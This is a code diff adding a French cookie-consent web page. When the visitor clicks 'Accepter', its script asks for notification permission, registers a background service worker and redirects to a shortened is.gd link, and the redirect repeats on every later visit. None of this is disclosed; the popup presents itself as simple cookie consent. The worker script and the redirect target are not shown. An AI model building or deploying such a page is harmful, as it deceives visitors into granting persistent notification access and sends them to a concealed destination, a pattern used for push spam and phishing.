@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gestion des Cookies</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #f4f4f4;
+        }
+
+        /* Contenu principal caché par défaut */
+        #main-content {
+            display: none;
+            padding: 50px;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        /* Popup de cookies */
+        #cookie-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            opacity: 1;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        button {
+            background: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="main-content">
+        <p>succès !</p>
+    </div>
+
+    <div id="cookie-popup">
+        <p>Nous utilisons des cookies pour améliorer votre expérience. Veuillez les accepter pour continuer.</p>
+        <button id="accept-cookies">Accepter</button>
+    </div>
+
+ <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const popup = document.getElementById("cookie-popup");
+        const mainContent = document.getElementById("main-content");
+        const redirectURL = "https://is.gd/HkqKDk"; 
+
+        if (localStorage.getItem("cookiesAccepted")) {
+            popup.style.display = "none";
+            mainContent.style.display = "block";
+            setTimeout(() => mainContent.style.opacity = "1", 100);
+            registerServiceWorker();
+
+            setTimeout(() => window.location.href = redirectURL, 2000);
+        }
+
+        document.getElementById("accept-cookies").addEventListener("click", function () {
+            localStorage.setItem("cookiesAccepted", "true"); 
+            popup.style.opacity = "0"; 
+            setTimeout(() => popup.style.display = "none", 300);
+
+            mainContent.style.display = "block";
+            setTimeout(() => mainContent.style.opacity = "1", 300);
+
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    console.log("✅ Notifications activées !");
+                } else {
+                    console.log("⚠️ Notifications refusées.");
+                }
+            });
+
+            registerServiceWorker();
+
+            setTimeout(() => window.location.href = redirectURL, 2000);
+        });
+    });
+
+    function registerServiceWorker() {
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/static/sw.js')
+                .then(reg => console.log("🔹 Service Worker installé :", reg.scope))
+                .catch(err => console.error("❌ Erreur Service Worker :", err));
+        }
+    }
+</script>
+</body>
+</html>
